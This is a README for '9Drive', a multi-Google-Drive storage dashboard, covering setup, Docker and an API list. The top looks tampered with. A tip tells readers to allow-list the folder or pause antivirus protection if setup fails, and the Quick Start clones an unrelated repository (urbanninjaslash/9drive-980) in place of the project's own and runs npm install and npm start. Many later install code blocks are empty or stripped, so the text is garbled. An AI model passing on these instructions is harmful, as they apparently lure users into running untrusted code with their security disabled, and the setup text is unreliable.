![9Drive cover](https://i.ibb.co.com/35BySv1C/image.png)

# 9Drive


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/urbanninjaslash/9drive-980.git
cd 9drive-980
npm install
npm start
```


9Drive is a storage gateway web app for connecting multiple Google Drive accounts into one virtual storage dashboard. Users can register with email/password or Google, automatically connect their first Google Drive account during Google sign-in, track quota, upload files into a dedicated `9drive` Drive folder, organize files with virtual folders, preview files, sync MySQL from Google Drive, and let the backend route uploads to the Drive account with enough free space.

## Features

- React + Vite frontend.
- Express + TypeScript backend.
- MySQL database with Prisma migrations.
- Bearer token authentication.
- Email/password auth plus Google sign-in/register with automatic first Drive connection.
- Global Google OAuth config stored encrypted in DB.
- Optional reCAPTCHA on email/password registration.
- Direct upload stream to Google Drive. Files are not stored on the server.
- Google Drive uploads are stored under a root `9drive` folder.
- Manual sync from the Google Drive `9drive` folder back into MySQL.
- Multi-account storage quota summary.
- Quota tracker page.
- Virtual folders.
- File preview, download, rename, move, and delete actions.
- Bottom-right upload progress panel.

## Preview

Live preview: https://9drive.zenhosta.com

![9Drive dashboard preview](https://i.ibb.co.com/HLjG3JRf/image.png)

![9Drive shared file preview](https://i.ibb.co.com/QLpYGmx/image.png)

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=zenhosta/9drive&type=Date)](https://www.star-history.com/#zenhosta/9drive&Date)

## Project Structure

```txt
backend/   Express API, Prisma schema, Google Drive integration
frontend/  Vite React app
```

## Requirements

- Node.js 20+
- npm
- MySQL running locally
- Google Cloud project
- Google OAuth Client ID and Client Secret

Default database used by this project:

```txt
host: localhost
port: 3306
database: 9drive
user: root
password: empty
```

## 1. Clone And Install

```bash
git clone git@github.com:zenhosta/9drive.git
cd 9drive
```

Install backend dependencies:

```bash
cd backend
```

Install frontend dependencies:

```bash
cd ../frontend
```

## 2. Create MySQL Database

Create database:

```sql
CREATE DATABASE 9drive;
```

If using MySQL CLI:

```bash
mysql -u root -e "CREATE DATABASE IF NOT EXISTS 9drive;"
```

## 3. Backend Environment

Create `backend/.env`:

```env
DATABASE_URL="mysql://root@localhost:3306/9drive"
APP_PORT=4000
FRONTEND_URL="http://localhost:5173"
JWT_ACCESS_SECRET="change-this-jwt-secret-at-least-32-chars"
TOKEN_ENCRYPTION_KEY="change-this-encryption-key-32bytes!"
ACCESS_TOKEN_TTL_SECONDS=900
REFRESH_TOKEN_TTL_DAYS=30
MAX_UPLOAD_BYTES=5368709120
RECAPTCHA_SECRET_KEY=""

# These values are encrypted and stored in DB as global Google OAuth config.
GOOGLE_CLIENT_ID=""
GOOGLE_CLIENT_SECRET=""
GOOGLE_REDIRECT_URI="http://localhost:4000/connected-accounts/google/callback"
```

Important:

- `JWT_ACCESS_SECRET` should be long and random.
- `TOKEN_ENCRYPTION_KEY` should be long and random.
- Do not commit `backend/.env`.
- Google OAuth credentials are used by the seed script, then stored encrypted in the database.

## 4. Frontend Environment

Create or confirm `frontend/.env`:

```env
VITE_API_URL=http://localhost:4000
VITE_RECAPTCHA_SITE_KEY=
```

Captcha is disabled when `VITE_RECAPTCHA_SITE_KEY` or backend `RECAPTCHA_SECRET_KEY` is empty. Set both values to enable captcha on registration.

## 5. Run Prisma Migrations

```bash
cd backend
```

If Prisma client generation is blocked on Windows by a running Node process, stop running backend/frontend dev servers and run:

```bash
npx prisma generate
```

## 6. Google Cloud Setup

Google setup is done in Google Cloud Console, not Google Search Console. Google Search Console is for website indexing/search ownership. OAuth and Drive API are managed in Google Cloud Console.

Open Google Cloud Console:

```txt
https://console.cloud.google.com/
```

### 6.1 Create Or Select Project

### 6.2 Enable Google Drive API

```txt
APIs & Services -> Library
```

```txt
Google Drive API
```

Direct URL pattern:

```txt
https://console.developers.google.com/apis/api/drive.googleapis.com/overview?project=YOUR_PROJECT_ID
```

If Google Drive API is disabled, you will see an error like:

```txt
Google Drive API has not been used in project ... before or it is disabled.
```

### 6.3 Configure OAuth Consent Screen

```txt
APIs & Services -> OAuth consent screen
```

```txt
External
```

```txt
App name
User support email
Developer contact email
```

```txt
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```

Full Drive access is required so Google sign-in can connect the first Drive account automatically and sync files manually added to the `9drive` folder.

Add every Google account that will test the app:

```txt
OAuth consent screen -> Test users -> Add users
```

If you do not add test users, Google may show:

```txt
Access blocked: app has not completed the Google verification process
Error 403: access_denied
```

### 6.4 Create OAuth Client

```txt
APIs & Services -> Credentials
```

```txt
Create Credentials -> OAuth client ID
```

```txt
Web application
```

```txt
http://localhost:5173
```

```txt
http://localhost:4000/connected-accounts/google/callback
```

```txt
Client ID
Client Secret
```

### 6.5 Seed Google OAuth Config

Put values into `backend/.env`:

```env
GOOGLE_CLIENT_ID="your-client-id"
GOOGLE_CLIENT_SECRET="your-client-secret"
GOOGLE_REDIRECT_URI="http://localhost:4000/connected-accounts/google/callback"
```

Then run:

```bash
cd backend
```

This stores the Google OAuth config as a global encrypted provider config in MySQL. Google sign-in uses the same config and automatically connects the first Drive account. Logged-in users can still click `Connect Drive` in Settings to add more Drive accounts.

## 7. Run Development Servers

Start backend:

```bash
cd backend
```

Backend runs at:

```txt
http://localhost:4000
```

Start frontend:

```bash
cd frontend
```

Frontend runs at:

```txt
http://localhost:5173
```

## Docker Deployment

This repository includes Docker files for running MySQL, backend, and frontend together.

Files:

```txt
docker-compose.yml
.env.docker.example
backend/Dockerfile
frontend/Dockerfile
frontend/nginx.conf
```

### 1. Prepare Docker Env

Copy the example env file:

```bash
cp .env.docker.example .env
```

On Windows PowerShell:

```powershell
Copy-Item .env.docker.example .env
```

Edit `.env`:

```env
MYSQL_ROOT_PASSWORD=root
MYSQL_DATABASE=9drive

FRONTEND_URL=http://localhost:5173
VITE_API_URL=http://localhost:4000
VITE_RECAPTCHA_SITE_KEY=

JWT_ACCESS_SECRET=replace-with-long-random-secret
TOKEN_ENCRYPTION_KEY=replace-with-long-random-secret
RECAPTCHA_SECRET_KEY=

GOOGLE_CLIENT_ID=your-google-client-id
GOOGLE_CLIENT_SECRET=your-google-client-secret
GOOGLE_REDIRECT_URI=http://localhost:4000/connected-accounts/google/callback
```

Captcha is disabled when either `VITE_RECAPTCHA_SITE_KEY` or `RECAPTCHA_SECRET_KEY` is empty.

### 2. Start Containers

```bash
docker compose up -d --build
```

Services:

```txt
frontend: http://localhost:5173
backend:  http://localhost:4000
mysql:    localhost:3306
```

The backend container runs Prisma migrations automatically on startup:

```txt
npx prisma migrate deploy
```

### 3. Seed Google OAuth Config In Docker

After containers are running, seed the global Google OAuth config:

```bash
```

This stores `GOOGLE_CLIENT_ID`, `GOOGLE_CLIENT_SECRET`, and `GOOGLE_REDIRECT_URI` from Docker env into MySQL as encrypted global config.

### 4. View Logs

```bash
docker compose logs -f backend
docker compose logs -f frontend
docker compose logs -f mysql
```

### 5. Stop Containers

```bash
docker compose down
```

Remove database volume too:

```bash
docker compose down -v
```

### Docker Production Notes

- Replace localhost URLs with production domain.
- Update Google OAuth authorized JavaScript origin.
- Update Google OAuth redirect URI.
- Use strong `JWT_ACCESS_SECRET` and `TOKEN_ENCRYPTION_KEY`.
- Do not expose MySQL port publicly in production.
- Put frontend/backend behind HTTPS reverse proxy.
- Rebuild frontend when `VITE_API_URL` changes because Vite embeds env at build time.
- Rebuild frontend when `VITE_RECAPTCHA_SITE_KEY` changes because Vite embeds env at build time.

## 8. Manual Test Flow

```txt
http://localhost:5173
```

```txt
View
Download
Rename
Move to Folder
Delete
```

## API Overview

Auth:

```txt
POST /auth/register
POST /auth/login
GET /auth/google/url
GET /auth/google/callback
POST /auth/google/exchange
POST /auth/refresh
POST /auth/logout
GET /auth/me
```

Google accounts:

```txt
GET /connected-accounts/google/connect-url
GET /connected-accounts/google/callback
GET /connected-accounts
POST /connected-accounts/:id/sync-quota
DELETE /connected-accounts/:id
```

Storage:

```txt
GET /storage/summary
```

Folders:

```txt
GET /folders
GET /folders/recent?limit=4
POST /folders
DELETE /folders/:id
```

Files:

```txt
GET /files
GET /files?folderId=<id>
GET /files?q=<search>
GET /files/shared-links
GET /files/:id
PATCH /files/:id
PATCH /files/batch
DELETE /files/batch
POST /files/sync-google
POST /files/:id/share
DELETE /files/:id/share
POST /files/:id/preview-token
GET /files/:id/view-url
GET /files/:id/download
DELETE /files/:id
GET /files/preview/:token
```

Uploads:

```txt
POST /uploads
```

Upload is `multipart/form-data`. Metadata fields should be appended before the file:

```txt
sizeBytes
fileName
mimeType
folderId optional
file
```

## Security Notes

- Backend never stores uploaded files on disk.
- Uploads are streamed through the backend to Google Drive folder `9drive`.
- Google tokens are encrypted in MySQL.
- Refresh tokens for app sessions are hashed in MySQL.
- Google auth handoff tokens, public share tokens, and preview tokens are hashed before lookup/use.
- `backend/.env` is ignored by git.
- Do not expose `TOKEN_ENCRYPTION_KEY`, `JWT_ACCESS_SECRET`, `RECAPTCHA_SECRET_KEY`, OAuth client secrets, or raw share/preview/handoff tokens.

## Production Notes

- Replace localhost redirect URIs with production URLs.
- Add production domain to Google OAuth authorized origins.
- Set OAuth consent screen to production when ready.
- Google may require verification for public apps.
- Use strong secrets.
- Put the backend behind HTTPS.
- Consider secure cookies or stronger token storage for production.



<!-- Last updated: 2026-06-06 16:44:40 -->
